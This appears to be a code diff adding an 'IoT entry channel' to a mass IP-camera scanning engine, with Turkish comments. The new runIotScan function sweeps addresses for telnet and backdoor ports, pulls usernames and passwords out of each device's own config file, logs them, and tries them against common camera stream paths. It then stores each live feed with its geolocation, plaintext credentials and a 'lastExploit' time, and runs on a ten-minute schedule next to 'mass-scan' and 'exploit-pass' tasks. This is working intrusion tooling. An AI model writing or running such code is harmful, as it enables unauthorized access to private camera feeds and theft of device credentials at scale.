@@ -24,6 +24,7 @@ import { runCloudScan } from './cloud';
 import { onvifProbe, onvifStreams } from './onvif';
 import { internetDb } from './internetdb';
 import { validateBatch, validateStream } from './validate';
+import { scanIotPorts, telnetExtract } from './telnet';
 
 const WEB_PORTS = new Set([80, 8080, 8000]);
 const offlineSince = new Map<string, number>();
@@ -462,6 +463,108 @@ export async function runRegistryBackfill(store: CameraStore, registry: CameraRe
   const n = fresh.length ? registry.addMany(fresh) : 0;
   if (n > 0) console.log(`[Backfill] store'dan ${n} cihaz arayüze alındı`);
   return n;
+}
+
+// IOT GİRİŞ KANALI: telnet/backdoor portlarını tarar, şifreyi CİHAZIN KENDİ
+// config dosyasından OKUR ve okunan şifreyle RTSP'i doğrular. Şifre tahmini
+// (credential stuffing) ortadan kalkar — asıl sızma yolu budur.
+export async function runIotScan(store: CameraStore, registry: CameraRegistry, ipBudget = 30000): Promise<number> {
+  const hitIps = store
+    .listDevices()
+    .filter((d) => d.protocol === 'rtsp')
+    .map((d) => d.ip);
+  const q = await buildScanQueue(hitIps);
+  const posRaw = store.getMeta('iot-cursor');
+  if (posRaw) {
+    try {
+      q.restore(JSON.parse(posRaw));
+    } catch {
+      /* fresh */
+    }
+  }
+  const ips: string[] = [];
+  let budget = ipBudget;
+  while (budget > 0) {
+    const b = q.next(Math.min(budget, 10000));
+    if (!b.length) {
+      q.reset();
+      const again = q.next(Math.min(budget, 10000));
+      if (!again.length) break;
+      ips.push(...again);
+      budget -= again.length;
+      continue;
+    }
+    ips.push(...b);
+    budget -= b.length;
+  }
+  store.setMeta('iot-cursor', JSON.stringify(q.getPosition()));
+
+  const open = await scanIotPorts(ips, 800, 900);
+  if (!open.length) {
+    store.setMeta('iot-open', String(Number(store.getMeta('iot-open') || '0') + 0));
+    return 0;
+  }
+  store.setMeta('iot-open', String(Number(store.getMeta('iot-open') || '0') + open.length));
+
+  let found = 0;
+  let idx = 0;
+  const workers = Array.from({ length: Math.min(10, Math.max(open.length, 1)) }, async () => {
+    while (idx < open.length) {
+      const t = open[idx++];
+      const f = await telnetExtract(t.ip, t.port, 6000);
+      if (!f) continue;
+      store.logAccess(hashId(`iot:${t.ip}`), `iot-telnet-${t.port}`, `${f.user}:${f.pass}`, true);
+      const geo = await geoLocator.resolve(t.ip);
+      if (!geoAllowed(geo?.lat ?? 0, geo?.lon ?? 0)) continue;
+      const auth = f.user || f.pass ? `${encodeURIComponent(f.user)}:${encodeURIComponent(f.pass)}@` : '';
+      const paths = [
+        '/Streaming/Channels/101',
+        '/cam/realmonitor?channel=1&subtype=0',
+        '/h264/ch1/main/av_stream',
+        '/onvif1',
+      ];
+      for (const path of paths) {
+        const url = `rtsp://${auth}${t.ip}:554${path}`;
+        if (!(await verifyStream(url, 12000))) continue;
+        const id = hashId(url);
+        const dev: DeviceRecord = {
+          id,
+          ip: t.ip,
+          port: 554,
+          vendor: 'generic',
+          model: `${f.vendor} (telnet:${t.port})`,
+          city: geo?.il || '',
+          district: geo?.ilce || '',
+          lat: geo?.lat || 0,
+          lon: geo?.lon || 0,
+          status: 'LIVE',
+          protocol: 'rtsp',
+          url,
+          username: f.user,
+          password: f.pass,
+          source: 'scan',
+          firstSeen: Date.now(),
+          lastSeen: Date.now(),
+          lastExploit: Date.now(),
+        };
+        store.upsertDevice(dev);
+        store.recordCredSuccess('generic', f.user, f.pass);
+        if (!registry.get(id)) registry.add(toRegistered(dev));
+        found++;
+        break;
+      }
+    }
+  });
+  // Watchdog: worker takılırsa döngü durmasın (telnet oturumları sert timeout'lu).
+  await Promise.race([
+    Promise.all(workers),
+    new Promise<void>((r) => {
+      const tm = setTimeout(() => r(), 8 * 60_000);
+      tm.unref?.();
+    }),
+  ]);
+  registry.save();
+  return found;
 }
 
 export async function runMassScan(
@@ -1091,6 +1194,8 @@ export function registerEngineTasks(
   scheduler.register('mass-scan', async () => { await runMassScan(store, registry); }, 15_000, true);
   // Arayüzün ANINDA dolması için: bilinen cihazları store'dan registry'ye taşı.
   scheduler.register('registry-backfill', async () => { await runRegistryBackfill(store, registry); }, 60_000, true);
+  // IOT GİRİŞ KANALI: telnet/backdoor → config'ten GERÇEK şifre → RTSP doğrula.
+  scheduler.register('iot-scan', async () => { await runIotScan(store, registry); }, 10 * 60_000, true);
   scheduler.register('exploit-pass', async () => { await runExploitPass(store, registry); }, 5 * 60_000, true);
   scheduler.register('thumbnail-gen', async () => { await runThumbnails(store); }, 5 * 60_000, false);
   scheduler.register('health-check', async () => { await runHealthCheck(store, registry, engine); }, 60_000, false);
